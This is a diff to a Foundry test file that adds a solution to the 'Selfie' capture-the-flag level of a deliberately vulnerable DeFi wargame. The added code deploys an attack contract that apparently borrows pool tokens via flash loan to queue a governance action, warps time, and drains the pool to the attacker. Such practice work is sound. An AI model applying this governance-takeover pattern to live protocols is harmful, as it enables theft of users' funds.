@@ -7,6 +7,7 @@ import "forge-std/Test.sol";
 import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
 import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";
+import {HackReceiver} from "../../../src/Contracts/selfie/hackReceiver.sol";
 
 contract Selfie is Test {
     uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
@@ -40,19 +41,39 @@ contract Selfie is Test {
 
         assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);
 
+        vm.prank(attacker);
+
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
+
+        vm.stopPrank();
     }
 
     function testExploit() public {
         /**
          * EXPLOIT START *
+         *
          */
+        console.log(unicode"the address of attacker is %s", attacker);
+        console.log(unicode"🤖 Starting the exploit... 🤖");
+        vm.prank(attacker);
+        HackReceiver hackReceiver = new HackReceiver(
+            address(selfiePool),
+            address(simpleGovernance),
+            address(dvtSnapshot)
+        );
+        hackReceiver.attack(TOKENS_IN_POOL - 100000);
+        vm.warp(180000);
+        hackReceiver.attackFinale();
+
+        console.log(unicode"🤖 Exploit complete. 🤖");
+        console.log(unicode"The balance of the attacker is: ", dvtSnapshot.balanceOf(attacker));
 
         /**
          * EXPLOIT END *
          */
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
+        vm.stopPrank();
     }
 
     function validation() internal {
